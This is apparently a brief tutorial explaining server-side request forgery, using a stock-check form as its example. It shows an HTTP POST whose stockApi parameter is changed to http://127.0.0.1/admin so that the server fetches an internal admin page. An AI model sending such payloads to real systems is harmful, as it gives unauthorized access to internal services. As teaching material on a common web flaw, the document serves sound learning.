# Server Side Request Forgery (SSRF)

This type of attack happens when the backend makes a request to an arbitrary URL supplied by the user.

Lets say a website asks for userinput to check if a specific product is available or not, the request will look like this

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://example.org/?product=user_input

That means essentially the server is returning contents from the API call what we can do is that we can modify the request like this

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://127.0.0.1/admin 

Now the server will make a request to admin endpoint and return it's contents which was not accessible to normal users because of authentication issues, but here the request is being made by the server hence there is no authentication issue we get the admin's content, Hence SSRF.
